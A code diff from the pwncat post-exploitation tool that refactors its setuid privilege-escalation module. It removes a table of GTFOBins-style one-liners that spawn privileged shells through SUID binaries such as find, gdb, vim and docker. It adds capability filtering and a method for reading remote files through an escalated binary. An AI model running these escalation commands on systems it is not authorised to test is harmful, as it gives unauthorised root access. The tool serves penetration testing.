@@ -6,76 +6,12 @@ from time import sleep
 import os
 from colorama import Fore, Style
 
-from pwncat.util import info, success, error, progress, warn
-from pwncat.privesc.base import Method, PrivescError, Technique
-from pwncat import gtfobins
+import io
 
-# https://gtfobins.github.io/#+suid
-known_setuid_privescs = {
-    "env": ("{} /bin/bash -p", "exit"),
-    "bash": ("{} -p", "exit"),
-    "chmod": ("{} +s /bin/bash\n/bin/bash -p", "exit"),
-    "chroot": ("{} / /bin/bash -p", "exit"),
-    "dash": ("{} -p", "exit"),
-    "ash": ("{}", "exit"),
-    "docker": ("{} run -v /:/mnt --rm -it alpine chroot /mnt sh", "exit"),
-    "emacs": ("""{} -Q -nw --eval '(term "/bin/sh -p")'""", "exit"),
-    "find": ("{} . -exec /bin/sh -p \\; -quit", "exit"),
-    "flock": ("{} -u / /bin/sh -p", "exit"),
-    "gdb": (
-        """{} -nx -ex 'python import os; os.execl("/bin/bash", "bash", "-p")' -ex quit""",
-        "exit",
-    ),
-    "logsave": ("{} /dev/null /bin/bash -i -p", "exit"),
-    "make": (
-        "COMMAND='/bin/sh -p'",
-        """{} -s --eval=$'x:\\n\\t-'\"$COMMAND\"""",
-        "exit",
-    ),
-    "nice": ("{} /bin/bash -p", "exit"),
-    "node": (
-        """{} -e 'require("child_process").spawn("/bin/sh", ("-p"), {stdio: (0, 1, 2)});'""",
-        "exit",
-    ),
-    "nohup": ("""{} /bin/sh -p -c \"sh -p <$(tty) >$(tty) 2>$(tty)\"""", "exit"),
-    "perl": ("""{} -e 'exec "/bin/sh";'""", "exit"),
-    "php": ("""{} -r \"pcntl_exec('/bin/sh', ('-p'));\"""", "exit"),
-    "python": ("""{} -c 'import os; os.execl("/bin/sh", "sh", "-p")'""", "exit"),
-    "rlwrap": ("{} -H /dev/null /bin/sh -p", "exit"),
-    "rpm": ("""{} --eval '%{lua:os.execute("/bin/sh", "-p")}'""", "exit"),
-    "rpmquery": ("""{} --eval '%{lua:posix.exec("/bin/sh", "-p")}'""", "exit"),
-    "rsync": ("""{} -e 'sh -p -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null""", "exit"),
-    "run-parts": ("""{} --new-session --regex '^sh$' /bin --arg='-p'""", "exit"),
-    "rvim": (
-        """{} -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'""",
-        "exit",
-    ),
-    "setarch": ("""{} $(arch) /bin/sh -p""", "exit"),
-    "start-stop-daemon": ("""{} -n $RANDOM -S -x /bin/sh -- -p""", "exit"),
-    "strace": ("""{} -o /dev/null /bin/sh -p""", "exit"),
-    "tclsh": ("""{}\nexec /bin/sh -p <@stdin >@stdout 2>@stderr; exit""", "exit"),
-    "tclsh8.6": ("""{}\nexec /bin/sh -p <@stdin >@stdout 2>@stderr; exit""", "exit"),
-    "taskset": ("""{} 1 /bin/sh -p""", "exit"),
-    "time": ("""{} /bin/sh -p""", "exit"),
-    "timeout": ("""{} 7d /bin/sh -p""", "exit"),
-    "unshare": ("""{} -r /bin/sh""", "exit"),
-    "vim": ("""{} -c ':!/bin/sh' -c ':q'""", "exit"),
-    "watch": ("""{} -x sh -c 'reset; exec sh 1>&0 2>&0'""", "exit"),
-    "zsh": ("""{}""", "exit"),
-    # need to add in cp trick to overwrite /etc/passwd
-    # need to add in curl trick to overwrite /etc/passwd
-    # need to add in wget trick to overwrite /etc/passwd
-    # need to add in dd trick to overwrite /etc/passwd
-    # need to add in openssl trick to overwrite /etc/passwd
-    # need to add in sed trick to overwrite /etc/passwd
-    # need to add in shuf trick to overwrite /etc/passwd
-    # need to add in systemctl trick to overwrite /etc/passwd
-    # need to add in tee trick to overwrite /etc/passwd
-    # need to add in wget trick to overwrite /etc/passwd
-    # need to add in nano trick but requires Control+R Control+X keys
-    # need to add in pico trick but requires Control+R Control+X keys
-    # b"/bin/nano": ["/bin/nano", "\x12\x18reset; sh -p 1>&0 2>&0"],
-}
+from pwncat.util import info, success, error, progress, warn
+from pwncat.privesc.base import Method, PrivescError, Technique, Capability
+from pwncat import gtfobins
+from pwncat.file import RemoteBinaryPipe
 
 
 class SetuidMethod(Method):
@@ -114,17 +50,24 @@ class SetuidMethod(Method):
                 self.suid_paths[user] = []
             self.suid_paths[user].append(path)
 
-    def enumerate(self) -> List[Technique]:
+    def enumerate(self, capability: int = Capability.ALL) -> List[Technique]:
         """ Find all techniques known at this time """
 
         if self.suid_paths is None:
             self.find_suid()
-
+        known_techniques = []
         for user, paths in self.suid_paths.items():
             for path in paths:
                 binary = gtfobins.Binary.find(path)
                 if binary is not None:
-                    yield Technique(user, self, binary)
+                    if (capability & binary.capabilities) == 0:
+                        continue
+
+                    known_techniques.append(
+                        Technique(user, self, binary, binary.capabilities)
+                    )
+
+        return known_techniques
 
     def execute(self, technique: Technique):
         """ Run the specified technique """
@@ -164,6 +107,15 @@ class SetuidMethod(Method):
                 self.pty.run(exit, wait=False)  # here be dragons
 
         raise PrivescError(f"escalation failed for {technique}")
+
+    def read_file(self, filepath: str, technique: Technique) -> RemoteBinaryPipe:
+        binary = technique.ident
+        read_payload = binary.read_file(filepath)
+
+        # read_pipe = self.pty.subprocess(read_payload)
+        read_pipe = io.BytesIO(self.pty.run(read_payload))
+
+        return read_pipe
 
     def get_name(self, tech: Technique):
         return f"{Fore.GREEN}{tech.user}{Fore.RESET} via {Fore.CYAN}{tech.ident.path}{Fore.RESET} ({Fore.RED}setuid{Fore.RESET})"
